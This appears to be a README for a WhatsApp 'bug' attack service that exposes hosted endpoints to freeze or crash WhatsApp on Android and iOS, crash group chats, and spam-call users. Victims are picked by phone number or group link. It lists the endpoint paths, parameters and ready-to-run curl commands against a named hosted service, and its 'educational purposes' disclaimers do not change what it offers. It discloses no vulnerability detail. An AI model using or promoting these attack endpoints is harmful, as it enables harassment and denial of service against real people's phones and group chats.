# TELEGRAM-BUG-BOT

# 🚀X-TECH-Bug API

The **X-TECH-Bug API** is a powerful endpoint API developed by **[X-TECH-CORP](https://github.com/X-TECH-CORP)** to exploit vulnerabilities in WhatsApp. This API provides endpoints that can:

- 🛑 Delay WhatsApp on Android devices.
- 🌋 Spam Call Users on WhatsApp.
- 🍎 Crash WhatsApp on iOS devices.
- 💥 Crash entire WhatsApp group chats.

> **⚠️ Warning:** This API is for educational purposes only. Misuse of this tool may result in serious legal consequences. Use responsibly.

---

## 🌟 Features

- 🔥 **Delay Android Devices**  
- 🕸️ **Spam Call Users**
- 🍏 **Crash iOS Devices**  
- 💬 **Crash Group Chats**

---

## 📌 Endpoints

### 1 **Delay Android WhatsApp**  
**Description:** Delay and crashes WhatsApp on Android devices.  
**Endpoint:**  
```bash
GET ${api_link}/freezeDroid?target=${number}
```  
**Parameters:**  
| Key      | Type   | Description                        |
|----------|--------|------------------------------------|
| `target` | String | The WhatsApp number to be targeted |

---

### 2 **Spam Call Users**  
**Description:** Spam call users on WhatsApp.  
**Endpoint:**  
```bash
GET ${api_link}/callSpam?target=${number}
```  
**Parameters:**  
| Key      | Type   | Description                        |
|----------|--------|------------------------------------|
| `target` | String | The WhatsApp number to be targeted |

---

### 3 **Crash iOS WhatsApp**  
**Description:** Crashes WhatsApp on iOS devices.  
**Endpoint:**  
```bash
GET ${api_link}/iosCrash?target=${number}
```  
**Parameters:**  
| Key      | Type   | Description                        |
|----------|--------|------------------------------------|
| `target` | String | The WhatsApp number to be targeted |

---

### 4 **Crash Group Chats**  
**Description:** Crashes an entire WhatsApp group chat.  
**Endpoint:**  
```bash
GET ${api_link}/crashGroup?target=${grouplink}
```  
**Parameters:**  
| Key        | Type   | Description                              |
|------------|--------|------------------------------------------|
| `target`   | String | The WhatsApp group chat link to target.  |

---

# Setup For Deployment 👇

## 🎯 Generate Pair Code For Session
[![Xeon](https://repl.it/badge/github/quiec/whatsasena)](https://replit.com/@DGXeon/Xeon-PairCode)

## ⚠️ Disclaimer

**Note:**  
This API is designed strictly for educational and research purposes to highlight vulnerabilities in applications. Any unauthorized use to harm individuals, groups, or organizations is strictly prohibited. Ensure you comply with all applicable laws before using this API.

---

## 💻 Example Usage

```bash
# Delay Android WhatsApp
curl -X GET "https://xeon-bug-api.onrender.com/freezeDroid?target=1234567890"

# Spam Call User
curl -X GET "https://xeon-bug-api.onrender.com/callSpam?target=1234567890"

# Crash iOS WhatsApp
curl -X GET "https://xeon-bug-api.onrender.com/iosCrash?target=1234567890"

# Crash Group Chat
curl -X GET "https://xeon-bug-api.onrender.com/crashGroup?target=https://chat.whatsapp.com/exampleGroupLink"
```

---

### 👨‍💻 Developed By: **[X-TECH-CORP](https://github.com/X-TECH-CORP)**

Enjoy bugging responsibly! ✨
